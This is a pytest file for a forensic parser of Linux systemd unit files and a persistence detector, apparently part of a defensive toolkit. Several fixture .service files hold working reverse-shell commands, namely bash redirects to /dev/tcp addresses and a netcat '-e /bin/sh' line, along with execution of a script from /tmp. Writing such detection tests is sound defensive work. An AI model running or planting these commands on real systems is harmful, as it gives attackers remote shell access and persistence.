"""Tests for Linux systemd unit file parser."""

from __future__ import annotations

from pathlib import Path

from sift_find_evil.detectors.linux_persistence import LinuxPersistenceDetector
from sift_find_evil.parsers.linux_systemd import parse_systemd_units


def test_parse_malicious_service(tmp_path: Path) -> None:
    """Parse a malicious systemd service with reverse shell command."""
    systemd_dir = tmp_path / "etc" / "systemd" / "system"
    systemd_dir.mkdir(parents=True)

    malicious_service = systemd_dir / "evil.service"
    malicious_service.write_text(
        "[Unit]\n"
        "Description=Evil backdoor\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    )

    units = parse_systemd_units(tmp_path)

    assert len(units) == 1
    assert units[0]["path"] == "/etc/systemd/system/evil.service"
    assert "bash -i" in units[0]["exec_start"]
    assert "/dev/tcp/10.0.0.1/4444" in units[0]["exec_start"]


def test_parse_benign_service(tmp_path: Path) -> None:
    """Parse a benign systemd service."""
    systemd_dir = tmp_path / "lib" / "systemd" / "system"
    systemd_dir.mkdir(parents=True)

    benign_service = systemd_dir / "sshd.service"
    benign_service.write_text(
        "[Unit]\n"
        "Description=OpenSSH Daemon\n"
        "\n"
        "[Service]\n"
        "Type=notify\n"
        "ExecStart=/usr/sbin/sshd -D\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    )

    units = parse_systemd_units(tmp_path)

    assert len(units) == 1
    assert units[0]["path"] == "/lib/systemd/system/sshd.service"
    assert units[0]["exec_start"] == "/usr/sbin/sshd -D"


def test_parse_multiple_exec_start_lines(tmp_path: Path) -> None:
    """Parse service with multiple ExecStart directives."""
    systemd_dir = tmp_path / "etc" / "systemd" / "system"
    systemd_dir.mkdir(parents=True)

    service = systemd_dir / "multi.service"
    service.write_text(
        "[Service]\n"
        "ExecStartPre=/bin/echo 'Starting'\n"
        "ExecStart=/usr/bin/app --config /etc/app.conf\n"
        "ExecStartPost=/bin/echo 'Started'\n"
    )

    units = parse_systemd_units(tmp_path)

    assert len(units) == 1
    exec_start = units[0]["exec_start"]
    assert "/bin/echo 'Starting'" in exec_start
    assert "/usr/bin/app --config /etc/app.conf" in exec_start
    assert "/bin/echo 'Started'" in exec_start


def test_parse_line_continuation(tmp_path: Path) -> None:
    """Parse service with line continuation backslashes."""
    systemd_dir = tmp_path / "etc" / "systemd" / "system"
    systemd_dir.mkdir(parents=True)

    service = systemd_dir / "continued.service"
    service.write_text(
        "[Service]\n"
        "ExecStart=/usr/bin/app \\\n"
        "  --option1 value1 \\\n"
        "  --option2 value2\n"
    )

    units = parse_systemd_units(tmp_path)

    assert len(units) == 1
    exec_start = units[0]["exec_start"]
    assert "--option1 value1" in exec_start
    assert "--option2 value2" in exec_start


def test_parse_drop_in_override(tmp_path: Path) -> None:
    """Parse service with drop-in .conf override."""
    base_dir = tmp_path / "etc" / "systemd" / "system"
    base_dir.mkdir(parents=True)

    base_service = base_dir / "app.service"
    base_service.write_text("[Service]\n" "ExecStart=/usr/bin/app\n")

    dropin_dir = base_dir / "app.service.d"
    dropin_dir.mkdir()
    dropin = dropin_dir / "override.conf"
    dropin.write_text(
        "[Service]\n"
        "ExecStart=\n"  # Clear original
        "ExecStart=/usr/bin/app --production\n"
    )

    units = parse_systemd_units(tmp_path)

    # Should find both base and drop-in
    assert len(units) == 2
    paths = {u["path"] for u in units}
    assert "/etc/systemd/system/app.service" in paths
    assert "/etc/systemd/system/app.service.d/override.conf" in paths


def test_parse_multiple_directories(tmp_path: Path) -> None:
    """Parse services from multiple standard directories."""
    (tmp_path / "etc" / "systemd" / "system").mkdir(parents=True)
    (tmp_path / "lib" / "systemd" / "system").mkdir(parents=True)
    (tmp_path / "usr" / "lib" / "systemd" / "system").mkdir(parents=True)

    (tmp_path / "etc" / "systemd" / "system" / "one.service").write_text(
        "[Service]\nExecStart=/bin/one\n"
    )
    (tmp_path / "lib" / "systemd" / "system" / "two.service").write_text(
        "[Service]\nExecStart=/bin/two\n"
    )
    (tmp_path / "usr" / "lib" / "systemd" / "system" / "three.service").write_text(
        "[Service]\nExecStart=/bin/three\n"
    )

    units = parse_systemd_units(tmp_path)

    assert len(units) == 3
    paths = {u["path"] for u in units}
    assert "/etc/systemd/system/one.service" in paths
    assert "/lib/systemd/system/two.service" in paths
    assert "/usr/lib/systemd/system/three.service" in paths


def test_empty_root_returns_empty_list(tmp_path: Path) -> None:
    """Return empty list when no systemd directories exist."""
    units = parse_systemd_units(tmp_path)
    assert units == []


def test_detector_flags_malicious_unit(tmp_path: Path) -> None:
    """LinuxPersistenceDetector flags parsed malicious unit."""
    systemd_dir = tmp_path / "etc" / "systemd" / "system"
    systemd_dir.mkdir(parents=True)

    malicious = systemd_dir / "backdoor.service"
    malicious.write_text(
        "[Service]\n" "ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9999\n"
    )

    benign = systemd_dir / "legitimate.service"
    benign.write_text("[Service]\n" "ExecStart=/usr/bin/nginx -g 'daemon off;'\n")

    units = parse_systemd_units(tmp_path)
    detector = LinuxPersistenceDetector()
    evidence = {"systemd_units": units}

    findings = detector.analyze(evidence)

    # Should find exactly one malicious unit
    assert len(findings) == 1
    assert "backdoor.service" in findings[0].title
    assert findings[0].severity == "critical"


def test_mutation_check_malicious_command_removal(tmp_path: Path) -> None:
    """Prove test guards behavior: changing malicious command removes finding."""
    systemd_dir = tmp_path / "etc" / "systemd" / "system"
    systemd_dir.mkdir(parents=True)

    service_path = systemd_dir / "test.service"

    # First: malicious command
    service_path.write_text(
        "[Service]\n"
        "ExecStart=/tmp/evil.sh\n"  # /tmp execution is suspicious
    )

    units_malicious = parse_systemd_units(tmp_path)
    detector = LinuxPersistenceDetector()
    findings_malicious = detector.analyze({"systemd_units": units_malicious})

    assert len(findings_malicious) == 1, "Malicious /tmp exec should trigger finding"

    # Second: change to benign command
    service_path.write_text(
        "[Service]\n"
        "ExecStart=/usr/local/bin/app\n"  # Benign path
    )

    units_benign = parse_systemd_units(tmp_path)
    findings_benign = detector.analyze({"systemd_units": units_benign})

    assert len(findings_benign) == 0, "Benign command should NOT trigger finding"


def test_symlink_escape_is_contained(tmp_path: Path) -> None:
    """A unit symlink pointing outside the mounted root must not be read."""
    import os

    root = tmp_path / "mnt"
    (root / "etc" / "systemd" / "system").mkdir(parents=True)
    secret = tmp_path / "host_secret.service"
    secret.write_text("[Service]\nExecStart=/bin/bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n")
    os.symlink(secret, root / "etc" / "systemd" / "system" / "evil.service")

    units = parse_systemd_units(root)

    assert all("dev/tcp" not in u["exec_start"] for u in units)


def test_repeated_exec_start_all_captured(tmp_path: Path) -> None:
    """All repeated ExecStart= lines are captured, not just the last."""
    d = tmp_path / "etc" / "systemd" / "system"
    d.mkdir(parents=True)
    (d / "multi.service").write_text(
        "[Service]\n"
        "ExecStart=/usr/bin/legit\n"
        "ExecStart=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        "ExecStart=/usr/bin/also-legit\n"
    )

    units = parse_systemd_units(tmp_path)

    assert len(units) == 1
    assert "/dev/tcp/10.0.0.1/4444" in units[0]["exec_start"]
    findings = LinuxPersistenceDetector().analyze({"systemd_units": units})
    assert len(findings) == 1


def test_percent_specifier_does_not_crash(tmp_path: Path) -> None:
    """systemd %-specifiers (e.g. %i, %h) must not break parsing."""
    d = tmp_path / "etc" / "systemd" / "system"
    d.mkdir(parents=True)
    (d / "tmpl@.service").write_text(
        "[Service]\nExecStart=/usr/bin/worker %i --home %h\n"
    )

    units = parse_systemd_units(tmp_path)

    assert units == [
        {
            "path": "/etc/systemd/system/tmpl@.service",
            "exec_start": "/usr/bin/worker %i --home %h",
        }
    ]
